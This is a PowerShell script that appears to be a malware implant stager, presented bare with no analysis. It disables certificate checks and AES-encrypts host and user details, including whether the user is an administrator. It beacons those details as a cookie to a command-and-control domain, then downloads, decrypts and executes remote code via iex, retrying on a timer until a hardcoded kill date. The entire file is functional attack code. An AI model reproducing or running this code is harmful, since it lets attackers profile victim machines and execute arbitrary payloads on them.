﻿[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$sc=""
$s=""
function CAM ($key,$IV){
try {$a = New-Object "System.Security.Cryptography.RijndaelManaged"
} catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
$a.Mode = [System.Security.Cryptography.CipherMode]::CBC
$a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$a.BlockSize = 128
$a.KeySize = 256
if ($IV)
{
if ($IV.getType().Name -eq "String")
{$a.IV = [System.Convert]::FromBase64String($IV)}
else
{$a.IV = $IV}
}
if ($key)
{
if ($key.getType().Name -eq "String")
{$a.Key = [System.Convert]::FromBase64String($key)}
else
{$a.Key = $key}
}
$a}
function ENC ($key,$un){
$b = [System.Text.Encoding]::UTF8.GetBytes($un)
$a = CAM $key
$e = $a.CreateEncryptor()
$f = $e.TransformFinalBlock($b, 0, $b.Length)
[byte[]] $p = $a.IV + $f
[System.Convert]::ToBase64String($p)
}
function DEC ($key,$enc){
$b = [System.Convert]::FromBase64String($enc)
$IV = $b[0..15]
$a = CAM $key $IV
$d = $a.CreateDecryptor()
$u = $d.TransformFinalBlock($b, 16, $b.Length - 16)
[System.Text.Encoding]::UTF8.GetString($u)}
function Get-Webclient ($Cookie) {
$d = (Get-Date -Format "dd/MM/yyyy");
$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
$k = [datetime]::ParseExact("01/06/2020","dd/MM/yyyy",$null);
if ($k -lt $d) {exit}
$username = ""
$password = ""
$proxyurl = ""
$wc = New-Object System.Net.WebClient;

$h=""
if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$wc.Headers.Add("Host",$h)}
elseif($h){$script:s="https://$($h)/business/retail-business/";$script:sc="https://$($h)"}
$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36")
$wc.Headers.Add("Referer","")
if ($proxyurl) {
$wp = New-Object System.Net.WebProxy($proxyurl,$true);
if ($username -and $password) {
$PSS = ConvertTo-SecureString $password -AsPlainText -Force;
$getcreds = new-object system.management.automation.PSCredential $username,$PSS;
$wp.Credentials = $getcreds;
} else { $wc.UseDefaultCredentials = $true; }
$wc.Proxy = $wp; } else {
$wc.UseDefaultCredentials = $true;
$wc.Proxy.Credentials = $wc.Credentials;
} if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
$wc }
function primer {
$cu = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$wp = New-Object System.Security.Principal.WindowsPrincipal($cu)
$ag = [System.Security.Principal.WindowsBuiltInRole]::Administrator
if ($wp.IsInRole($ag)){$el="*"}else{$el=""}
try{$u=($cu).name+$el} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
$o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://investersalliance.net:443"
try {$pp=enc -key CUH8sj+EC5dilycMVuMMOiUWVEGGfyGMzX+lOsooosk= -un $o} catch {$pp="ERROR"}
$primer = (Get-Webclient -Cookie $pp).downloadstring($s)
$p = dec -key CUH8sj+EC5dilycMVuMMOiUWVEGGfyGMzX+lOsooosk= -enc $primer
if ($p -like "*key*") {$p| iex}
}
try {primer} catch {}
Start-Sleep 300
try {primer} catch {}
Start-Sleep 600
try {primer} catch {}
